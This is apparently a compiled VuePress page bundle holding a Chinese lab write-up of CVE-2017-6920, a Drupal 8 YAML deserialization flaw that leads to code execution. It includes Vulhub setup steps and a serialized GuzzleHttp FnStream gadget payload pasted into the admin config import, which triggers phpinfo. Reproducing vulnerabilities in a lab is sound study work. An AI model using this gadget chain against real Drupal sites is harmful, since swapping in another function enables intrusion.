import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as t,c as r,a as e,b as n,d as o,e as d}from"./app-58e4a7d6.js";const c={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),p=e("p",null,"影响软件：Drupal",-1),u=e("p",null,"方式：反序列化",-1),m={href:"https://paper.seebug.org/334/",target:"_blank",rel:"noopener noreferrer"},b=d(`<p>效果：任意代码执行</p><blockquote><p>PECL：PHP Extension Community Library</p><p>YAML：Yet Another Markup Language</p></blockquote><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动 drupal 8.3.0 的环境：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8080/</code> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221912492.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>先安装 <code>yaml</code> 扩展</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 换镜像源，默认带vim编辑器，所以用cat换源，可以换成自己喜欢的源
cat &gt; sources.list &lt;&lt; EOF
deb http://mirrors.163.com/debian/ jessie main non-free contrib
deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib
deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib
deb-src http://mirrors.163.com/debian/ jessie main non-free contrib
deb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib
deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib
deb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib
deb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib
EOF
# 安装依赖
apt update
apt-get -y install gcc make autoconf libc-dev pkg-config
apt-get -y install libyaml-dev
# 安装yaml扩展
pecl install yaml
docker-php-ext-enable yaml.so
# 启用 yaml.decode_php 否则无法复现成功
echo &#39;yaml.decode_php = 1 = 1&#39;&gt;&gt;/usr/local/etc/php/conf.d/docker-php-ext-yaml.ini
# 退出容器
exit
# 重启容器，CONTAINER换成自己的容器ID
docker restart CONTAINER
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>登录一个管理员账号，访问 <code>http://[your ip]:8080/admin/config/development/configuration/single/import</code></p><p>如下图所示，<code>配置类型</code> 选择 <code>简单配置</code>，<code>配置名称</code> 任意填写，<code>将配置粘贴到此处</code> 中填写PoC如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>!php/object &quot;O:24:\\&quot;GuzzleHttp\\\\Psr7\\\\FnStream\\&quot;:2:{s:33:\\&quot;\\0GuzzleHttp\\\\Psr7\\\\FnStream\\0methods\\&quot;;a:1:{s:5:\\&quot;close\\&quot;;s:7:\\&quot;phpinfo\\&quot;;}s:9:\\&quot;_fn_close\\&quot;;s:7:\\&quot;phpinfo\\&quot;;}&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221914100.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>点击 <code>导入</code> 后可以看到漏洞触发成功，弹出 <code>phpinfo</code> 页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221914816.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16);function v(h,g){const i=s("ExternalLinkIcon");return t(),r("div",null,[l,p,u,e("p",null,[n("参考链接："),e("a",m,[n("CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造"),o(i)])]),b])}const x=a(c,[["render",v],["__file","Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞 CVE-2017-6920.html.vue"]]);export{x as default};
